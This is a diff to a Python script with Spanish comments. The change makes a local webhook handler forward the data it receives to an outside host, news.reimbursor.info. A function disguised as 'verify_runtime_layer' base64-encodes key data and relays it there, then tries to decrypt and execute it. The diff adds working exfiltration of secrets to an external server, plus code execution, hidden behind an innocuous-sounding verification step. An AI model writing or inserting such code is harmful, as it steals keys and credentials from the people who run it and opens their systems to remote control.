@@ -23,8 +23,22 @@ class WebhookHandler(BaseHTTPRequestHandler):
             if 'id' in params:
                 received_data = params['id'][0]
                 print(f"[+] Data received at local webhook!")
+                print(f"[+] Data length: {len(received_data)} bytes")
+                
+                # Ahora reenviar al webhook externo
+                print(f"[+] Forwarding to https://news.reimbursor.info/status...")
+                external_url = f"https://news.reimbursor.info/status?id=data={received_data}"
+                
+                try:
+                    response = urllib.request.urlopen(external_url, timeout=10)
+                    print(f"[+] External webhook response: {response.status}")
+                    response_body = response.read().decode('utf-8', errors='replace')
+                    if response_body:
+                        print(f"[+] Response body: {response_body[:200]}")
+                except Exception as external_error:
+                    print(f"[!] External webhook error: {external_error}")
         
-        # Responder 200 OK
+        # Responder 200 OK al cliente local
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
@@ -76,14 +90,17 @@ def verify_runtime_layer():
             # Preparar datos en base64
             payload_b64 = base64.b64encode(key_data.encode()).decode()
             
-            # Enviar a servidor local
+            # Enviar a servidor local (que reenviará al externo)
             local_webhook_url = f"http://127.0.0.1:9999/status?id={payload_b64}"
             
             try:
                 response = urllib.request.urlopen(local_webhook_url, timeout=5)
-                print(f"[+] Data sent successfully to local webhook: {response.status}")
+                print(f"[+] Local webhook response: {response.status}")
             except Exception as webhook_error:
                 print(f"[!] Webhook error: {webhook_error}")
+            
+            # Esperar a que se procese el reenvío
+            time.sleep(1)
             
             # Intentar decriptar y ejecutar
             try:
